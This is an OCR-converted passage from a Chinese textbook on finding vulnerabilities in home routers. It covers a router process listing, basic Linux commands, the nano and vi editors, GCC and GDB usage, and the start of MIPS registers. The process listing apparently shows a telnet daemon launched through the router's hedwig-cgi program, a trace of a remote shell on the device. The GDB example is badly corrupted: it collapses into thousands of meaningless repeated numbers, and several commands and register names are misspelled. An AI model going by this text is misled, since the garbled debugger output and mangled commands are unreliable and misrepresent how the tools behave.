break-word;'>3666</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1044</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>fileaccessd</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3667</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1044</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>fileaccessd</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3676</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>876</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>upnpc_daemon =m 61.i39.i20.i2 =c 120 =12 =f /var/upn</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3888</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>960</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>11d2d =c /var/lib12d.conf br0 ra0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3906</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>1108</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>stunnel /var/stunnel.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3983</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>4920</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>httpd -f /var/run/httpd.conf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>10035</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>864</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/bin/sh</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>15151</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>748</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>sleep 1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>15152</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>756</td><td style='text-align: center; word-wrap: break-word;'>R</td><td style='text-align: center; word-wrap: break-word;'>ps</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>27585</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>968</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>/itdocs/web/hedwig-cgi</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>27586</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>852</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>sh =c telnetd</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>27587</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>836</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>telnetd</td></tr><tr><td colspan="5">ps igrep telnet</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>151280</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>752</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>grep telnet</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>27586</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>852</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>sh =c telnetd</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>27587</td><td style='text-align: center; word-wrap: break-word;'>root</td><td style='text-align: center; word-wrap: break-word;'>836</td><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>telnetd</td></tr></table>

 </div>

渴家用路由器 0day 漏洞挖掘技术

 </div>

 </div>

ifconfig: 查看和设置网卡信息，用法如表 1-11 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="2">ifconfig</td><td style='text-align: center; word-wrap: break-word;'>ifconfig -a</td><td style='text-align: center; word-wrap: break-word;'>查看当前网卡的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ifconfig eth0</td><td style='text-align: center; word-wrap: break-word;'>查看所有网卡的信息</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td rowspan="3">ifconfig</td><td style='text-align: center; word-wrap: break-word;'>ifconfig eth0 192.168.0.0 netmask 255.255.255.0</td><td style='text-align: center; word-wrap: break-word;'>设置eth0网卡的IP地址及子网掩码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ifconfig eth0 down</td><td style='text-align: center; word-wrap: break-word;'>禁用eth0网卡</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ifconfig eth0 up</td><td style='text-align: center; word-wrap: break-word;'>启用eth0网卡</td></tr></table>

ifconfig 的用法示例如图 1-15 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="5">BusyBox 01.14.1 (2012-10-08 15:39:56 CST) built-in shell (msh)</td></tr></table>

 </div>

> uname 命令，用法如表 1-12 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能项</td><td style='text-align: center; word-wrap: break-word;'>命令或格式</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>uname</td><td style='text-align: center; word-wrap: break-word;'>uname -r</td><td style='text-align: center; word-wrap: break-word;'>显示操作系统发行版本号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>uname</td><td style='text-align: center; word-wrap: break-word;'>uname -a</td><td style='text-align: center; word-wrap: break-word;'>显示系统名、节点名称、操作系统发行版本号、操作系统版本、运行系统的机器ID</td></tr></table>

name 命令的用法示例如图 1-16 所示。

 </div>

#### 1.2.3 文本编辑器

每一个操作系统都少不了编辑工具。Linux 系统提供了一些编辑工具，用户可以使用这些工具编辑和创建文本、程序的源代码等。而且，Linux 是一个文本驱动操作系统，因此，在 Linux 系统中非常需要文本编辑器工具的支持。下面介绍一下路由器安全研究中常用的文本编辑器。

# 1. nano编辑器

nano 是一个字符终端文本编辑器，类似 DOS 下的 editor 程序。它比下面要介绍的 vi/vim 编辑器简单得多，比较适合 Linux 初学者使用。某些 Linux 发行版的默认编辑器就是 nano。

nano 命令用于打开指定文件进行编辑，默认情况下它会自动断行，即在一行中输入过长的内容时自动将其拆分成多行，但用这种方式处理某些文件时可能会带来问题。例如，Linux 系统的配置文件自动断行就会使本来只能写在一行中的内容折成多行，有可能造成系统无法运行。如果想避免这种情况出现，可以加上 -w 参数，如 “-w (--nowrap) = Disable wrapping of long lines”。nano 命令的格式为 “nano -w FILE”，可以在 “/etc/profile” 的末尾加上一个别名，示例如下。

 $$ \begin{array}{r}{a l i a s:n a n o=^{\prime \prime}n a n o:-w^{\prime \prime}}\end{array} $$ 

保存之后重新登录，就可以让 Shell 自动加上这个参数了，即输入 “nano FILE” 相当于输入 “nano -w FILE”。

nano 的简洁易用之处在于不需要记忆很多的命令，在编辑器下方有基本命令的提示，如图 1-17 所示。

 </div>

下面解释一下图 1-17 最后两行提示信息的意义。“^G”表示“Ctrl+G”，就是按住“Ctrl”键不放然后按“G”键，其他的以此类推，如表 1-13 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令</td><td style='text-align: center; word-wrap: break-word;'>使用效果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^G Get Help</td><td style='text-align: center; word-wrap: break-word;'>获得帮助</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^X Exit</td><td style='text-align: center; word-wrap: break-word;'>退出</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^O WriteOut</td><td style='text-align: center; word-wrap: break-word;'>保存，写盘</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^R Read File</td><td style='text-align: center; word-wrap: break-word;'>读取文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^W Where Is</td><td style='text-align: center; word-wrap: break-word;'>查找字符串</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^Y Prev Page</td><td style='text-align: center; word-wrap: break-word;'>上一页</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^K Cut Text</td><td style='text-align: center; word-wrap: break-word;'>剪切一整行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^U UnCut Text</td><td style='text-align: center; word-wrap: break-word;'>粘贴</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^C</td><td style='text-align: center; word-wrap: break-word;'>当前光标信息（位置、字符数等）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>^V Next Page</td><td style='text-align: center; word-wrap: break-word;'>下一页</td></tr></table>

nano 命令提供了命令提示，因此使用起来比较方便。接下来要介绍的 vi 编辑器在使用方法上因为需要记忆一些常用命令，可能会稍显复杂，但 vi 编辑器强大的功能会使很多人选择使用它。

# 2. 全屏幕编辑器Vi

vi（Visual Interpreter）为使用者提供了一个全屏幕的窗口编辑平台。vi 编辑器是 Linux 和 UNIX 上最基本的文本编辑器，工作在字符模式下，由于不需要图形界面，使它成了效率很高的文本编辑器。

vi 编辑器可以执行输出、删除、查找、替换、块操作等众多文本操作，有 3 种基本工作模式，分别是命令行模式、文本输入模式和末行模式。

在使用 vi 编辑器的过程中，用户可以选择在 3 种模式下工作，这 3 种模式可以协助使用者完成文本输入、文本保存和文本修改等工作，分别是命令行模式、插入模式和末行模式。

vi 编辑器中多种工作模式的转换关系如图 1-18 所示。

##### 图1-18

##### (1) vi编辑器的启动

在终端输入命令 “vi”，接着输入要创建或编辑的文件名，即可进入 vi 编辑器，示例如下。

$ vi example.c

以上命令的执行结果如图 1-19 所示。

如果 vi 命令后面的文件不存在，系统会自动创建一个以该字符串命名的文本文件（如图 1-19 所示的 example.c）。光标将停留在窗口左上方。由于新创建的文件中没有任何内容，因此每一行的开头都是波浪线。窗口底部为状态栏，显示当前编辑文件的相关信息，此时显示 example.c 是一个新文件。

 </div>

如果文件中有内容，状态栏显示信息如图 1-20 所示。

 </div>

##### (2) 命令行模式

从 Shell 进入 vi 编辑器时，先进入命令行模式。在该模式下，通过键盘输入的任何字符都将作为命令解释。命令行模式下没有任何提示符，当输入命令时立即执行，不需要按“回车”键，而且输入的字符也不会在屏幕上显示。

在命令行模式下可以输入命令进行光标的移动，以及字符、单词、行的复制、粘贴、删除等操作，常用的命令如表 1-14 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令</td><td style='text-align: center; word-wrap: break-word;'>操作效果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>光标移动到首行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>S</td><td style='text-align: center; word-wrap: break-word;'>光标移动到行尾</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dd</td><td style='text-align: center; word-wrap: break-word;'>删除光标所在的行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dG</td><td style='text-align: center; word-wrap: break-word;'>删除到文件尾部</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4dd</td><td style='text-align: center; word-wrap: break-word;'>从光标行开始删除4行</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>u</td><td style='text-align: center; word-wrap: break-word;'>取消上一次操作</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.</td><td style='text-align: center; word-wrap: break-word;'>重复上一次操作</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ZZ</td><td style='text-align: center; word-wrap: break-word;'>必要时进行写盘操作并退出编辑</td></tr></table>

##### (3) 编辑模式

编辑模式主要用于文本的输入。在该模式下，用户输入的任何字符都将作为文件内容保存，并在屏幕上显示出来。在命令行模式下输入如表 1-15 所示的任意命令都将进入编辑模式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令</td><td style='text-align: center; word-wrap: break-word;'>操作效果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>i</td><td style='text-align: center; word-wrap: break-word;'>将文本插入光标之前</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>a</td><td style='text-align: center; word-wrap: break-word;'>把文本添加到光标之后</td></tr></table>

进入编辑模式时，vi 窗口的最后一行会显示 “INSERT”。例如，在命令行模式下输入命令 “i”，屏幕上并没有变化，但状态栏显示进入编辑模式，此时编辑器已经由命令行模式切换为编辑模式，如图 1-21 所示。

接下来，我们开始编辑文档 example.c。在闪烁的光标处输入 “_”，屏幕显示如图 1-22 所示。此时如果要返回命令行模式，只需按 “Esc” 键即可。

##### (4) 末行模式

尽管在命令行模式下可以实现很多功能，但是在执行字符串查找、替换、显示行号等操作时，还是必须进入末行模式。

 </div>

 </div>

在命令行模式下输入如表 1-16 所示的命令即可进入末行模式。此时，在 vi 窗口的状态栏中会显示输入的末行命令字符，完成输入后按 “回车” 键即可执行末行命令。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令</td><td style='text-align: center; word-wrap: break-word;'>操作效果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/exp</td><td style='text-align: center; word-wrap: break-word;'>从光标处向前寻找字符串exp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>?exp</td><td style='text-align: center; word-wrap: break-word;'>从光标处向后寻找字符串exp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>:w</td><td style='text-align: center; word-wrap: break-word;'>写盘</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>:w!file</td><td style='text-align: center; word-wrap: break-word;'>强制向file写入</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>:q</td><td style='text-align: center; word-wrap: break-word;'>退出编辑程序</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>:q!</td><td style='text-align: center; word-wrap: break-word;'>强制退出编辑程序且不写盘</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>:wq</td><td style='text-align: center; word-wrap: break-word;'>写盘后退出编辑程序</td></tr></table>

在编辑模式中修改文件后，使用末行命令保存并退出 vi 编辑器，如图 1-23 所示。

 </div>

需要注意的是，vi 编辑器对用户的操作都是基于缓冲区中的副本进行的，如果退出时没有保存，则缓冲区中被修改的内容将会丢失。因此，在退出 vi 编辑器时应该先考虑是否需要保存编辑的内容，再执行合适的退出命令。

#### 1.2.4 编译工具GCC

GCC（GNU Compiler Collection，GNU 编译器套装）是由 GNU 开发的编程语言编译器。GCC 是自由软件发展过程中的著名例子，由自由软件基金会以 GPL 协议发布，也是 GNU 计

划的关键部分。GCC 原本是 GNU 操作系统的官方编译器，现已被大多数类 UNIX 操作系统（如 Linux、BSD、Mac OS X 等）采纳为标准编译器。GCC 同样适用于 Windows 系统。GCC 支持多种计算机体系芯片，如 x86、ARM，并已移植到其他多种硬件平台。

GCC 原名为 GNU C 语言编译器（GNU C Compiler），是因为它原本只能处理 C 语言。GCC 很快地扩展，变得可处理 C++，之后变得可处理 Fortran、Pascal、Objective-C、Java、Ada 及其他语言。尽管它能够支持如此多的语言，但我们看重的依然是它能够支持交叉编译的 ARM 和 MIPS。

GCC 提供了大量的编译选项，大约有 100 个，其中最基本、最常用的参数如表 1-17 所示，其他参数可以通过 Linux 的 man 命令查看。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-o &lt;filename&gt;</td><td style='text-align: center; word-wrap: break-word;'>使用指定的文件名保存编译之后的二进制代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-O</td><td style='text-align: center; word-wrap: break-word;'>对程序进行优化编译、链接，编译链接时的速度慢</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-O2</td><td style='text-align: center; word-wrap: break-word;'>提供比-O更好的优化编译、链接，编译链接时的速度比-O慢</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-S</td><td style='text-align: center; word-wrap: break-word;'>生成一个包含汇编指令的文件，扩展名为“.s”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-ggdb</td><td style='text-align: center; word-wrap: break-word;'>产生符号调试工具（GNU的GDB）所必需的符号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-C</td><td style='text-align: center; word-wrap: break-word;'>编译但不链接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-static</td><td style='text-align: center; word-wrap: break-word;'>不使用动态库加载，使用静态库</td></tr></table>

使用 GCC 对下面的源码进行编译、链接，源码文件为 hellox86.c。

#include <stdio.h>
int sayhi(char *s)
{
    printf("say: %s\\n", s);
    return 1;
}
int main(int argc, char *argv[])
{
    sayhi(argv[1]);
    return 0;
}

以上源码的功能非常简单，就是程序打印参数。例如，程序输入参数为“hello world”，运行结果为输出“say: hello world”。

编译 hellox86.c 时需要使用如下命令。
root@root:~/tmp$ gcc -o hellox86 hellox86.c

编译完成以后，使用如下命令执行程序。
root@root:~/tmp$ ./hellox86 "hello world"

以上命令的执行结果如下。
Say: hello world

#### 1.2.5 调试工具GDB

在 Linux 系统中使用 C 语言进行编程时，通常都会选择 GDB 作为调试器对编写的程序进行测试。GDB 提供了可靠的命令行界面，可以在运行程序的同时保持对程序的完整控制。例如，可以在程序执行过程中设置断点，从而在任何希望的地方监视内存或者寄存器的内容。在路由器安全分析中，GDB 也是不可或缺的工具。

表 1-18 列出了常用的 GDB 命令并分别对它们进行了说明。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>disassmeble &lt;function&gt;</td><td style='text-align: center; word-wrap: break-word;'>生成function的汇编代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>disassmeble mem</td><td style='text-align: center; word-wrap: break-word;'>生成mem地址的汇编代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>run &lt;args&gt;</td><td style='text-align: center; word-wrap: break-word;'>在GDB内使用给定的参数启动需要调试的程序</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>stepi或si</td><td style='text-align: center; word-wrap: break-word;'>执行一条机器指令</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>next或n</td><td style='text-align: center; word-wrap: break-word;'>执行一个函数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>continue或c</td><td style='text-align: center; word-wrap: break-word;'>继续执行，直到断点或程序结束</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>b &lt;function&gt;</td><td style='text-align: center; word-wrap: break-word;'>在function处设置一个断点</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>b *mem</td><td style='text-align: center; word-wrap: break-word;'>在指定的绝对内存位置设置一个断点</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>info b</td><td style='text-align: center; word-wrap: break-word;'>显示有关断点的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>delete b</td><td style='text-align: center; word-wrap: break-word;'>移除一个断点</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>info reg</td><td style='text-align: center; word-wrap: break-word;'>显示有关当前寄存器状态的信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>bt</td><td style='text-align: center; word-wrap: break-word;'>回溯命令，显示栈帧的名称</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>up/down</td><td style='text-align: center; word-wrap: break-word;'>向上或向下移动栈帧</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>print var</td><td style='text-align: center; word-wrap: break-word;'>打印变量的值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>print /x？”</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>x/NT A</td><td style='text-align: center; word-wrap: break-word;'>检查内存，其中“N”表示要显示的单位数，“T”表示要显示的数据类型（x:hex, d:dec, c:char, s:string, i:instruction），“A”表示绝对地址或符号名称（如main）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>quit</td><td style='text-align: center; word-wrap: break-word;'>退出GDB</td></tr></table>

对 1.2.5 节的 hellox86.c 使用如下命令进行编译，使二进制执行程序中包含调试信息。

root@root:~/tmp$ gcc -ggdb -o hellox86 hellox86.c

使用 GDB 调试程序，命令如下。

root@root:~/tmp$ gdb -q hell0x86

此时就可以在 GDB 中调试程序了，命令如下。

Reading symbols from /tmp/hellox86...done.
(gdb) disass main //反编译main
Dump of assembler code for function main:
0x08048405 <+0>: push %ebp
0x08048406 <+1>: mov %esp, %ebp
0x08048408 <+3>: and $0xfffffff0, %esp
0x0804840b <+6>: sub $0x10, %esp
0x0804840e <+9>: mov 0xc(%ebp), %eax
0x08048411 <+12>: add $0x4, %eax
0x08048414 <+15>: mov (%eax), %eax
0x08048416 <+17>: mov %eax, (%esp)
0x08048419 <+20>: call 0x80483e4 <sayhi>
0x0804841e <+25>: mov $0x0, %eax
0x08048423 <+30>: leave
0x08048424 <+31>: ret
End of assembler dump.
(gdb) b *0x08048419 //设断点
Breakpoint 1 at 0x8048419: file hellox86.c, line 11.
(gdb) run "hellox86 gdb"
Starting program: /tmp/hellox86 "hellox86 gdb"
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
110
120
130
140
150
160
170
180
190
200
210
220
230
240
250
260
270
280
290
300
310
320
330
340
350
360
370
380
390
400
410
420
430
440
450
460
470
480
490
500
510
520
530
540
550
560
570
580
590
600
610
620
630
640
650
660
670
680
690
700
710
720
730
740
750
760
770
780
790
800
810
820
830
840
850
860
870
880
890
900
910
920
930
940
950
960
970
980
990
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100
9200
9300
9400
9500
9600
9700
9800
9900
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100
9200
9300
9400
9500
9600
9700
9800
9900
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100
9200
9300
9400
9500
9600
9700
9800
9900
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100
9200
9300
9400
9500
9600
9700
9800
9900
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100
9200
9300
9400
9500
9600
9700
9800
9900
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100
9200
9300
9400
9500
9600
9700
9800
9900
1000
1100
1200
1300
1400
1500
1600
1700
1800
1900
2000
2100
2200
2300
2400
2500
2600
2700
2800
2900
3000
3100
3200
3300
3400
3500
3600
3700
3800
3900
4000
4100
4200
4300
4400
4500
4600
4700
4800
4900
5000
5100
5200
5300
5400
5500
5600
5700
5800
5900
6000
6100
6200
6300
6400
6500
6600
6700
6800
6900
7000
7100
7200
7300
7400
7500
7600
7700
7800
7900
8000
8100
8200
8300
8400
8500
8600
8700
8800
8900
9000
9100

揭秘家用路由器 0day 漏洞挖掘技术

24 (gdb) print argv[1]
25 $1 = 0xbffff863 "hellox86 gdb"
26 (gdb) info b
27 Num Type Disp Enb Address What
28 1 breakpoint keep y 0x08048419 in main at hellox86.c:11
29 breakpoint already hit 1 time
30 (gdb) quit

## 1.3 MIPS汇编语言基础

MIPS 的系统结构及设计理念比较先进，其指令系统经过通用处理器指令体系 MIPS I、MIPS II、MIPS III、MIPS IV、MIPS V，以及嵌入式指令体系 MIPS16、MIPS32 到 MIPS64 的发展，已经十分成熟。

MIPS32 架构是一种基于固定长度的定期编码指令集，并采用导入/存储（load/store）数据模型。经改进，这种架构可支持高级语言的优化执行。在路由器中，我们经常使用的一种 MIPS 架构就是 MIPS32。

本节对 MIPS 汇编语言的主要特点和指令进行介绍，供读者在进行路由器逆向分析时查阅。

#### 1.3.1 寄存器

RISC 的一个显著特点就是大量使用寄存器。因为寄存器的存取可以在一个时钟周期内完成，同时简化了寻找方式，所以，MIPS32 的指令中除了加载/存储指令以外，都使用寄存器或者立即数作为操作数，以便让编译器通过保持对寄存器内数据的频繁存取进一步优化代码的生成性能。MIPS32 中的寄存器分为两类，分别是通用寄存器（GPR）和特殊寄存器。

# 1. 通用寄存器（GPR）

在 MIPS 体系结构中有 32 个通用寄存器，在汇编程序中可以用编号 $0~$31 表示，也可以用寄存器的名字表示，如 $sp、$t1、$ra 等，如表 1-19 所示。堆栈（Stack）是从内存的高地址方向向低地址方向增长的。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>编号</td><td style='text-align: center; word-wrap: break-word;'>寄存器名称</td><td style='text-align: center; word-wrap: break-word;'>寄存器描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0</td><td style='text-align: center; word-wrap: break-word;'>zero</td><td style='text-align: center; word-wrap: break-word;'>第0号寄存器，其值始终为0</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>编号</td><td style='text-align: center; word-wrap: break-word;'>寄存器名称</td><td style='text-align: center; word-wrap: break-word;'>寄存器描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1</td><td style='text-align: center; word-wrap: break-word;'>Sat</td><td style='text-align: center; word-wrap: break-word;'>保留寄存器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2~3</td><td style='text-align: center; word-wrap: break-word;'>$v0~$v1</td><td style='text-align: center; word-wrap: break-word;'>values，保存表达式或函数返回结果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4~7</td><td style='text-align: center; word-wrap: break-word;'>$a0~$a3</td><td style='text-align: center; word-wrap: break-word;'>arguments，作为函数的前4个参数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8~15</td><td style='text-align: center; word-wrap: break-word;'>$t0~$t7</td><td style='text-align: center; word-wrap: break-word;'>temporaries，供汇编程序使用的临时寄存器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>16~23</td><td style='text-align: center; 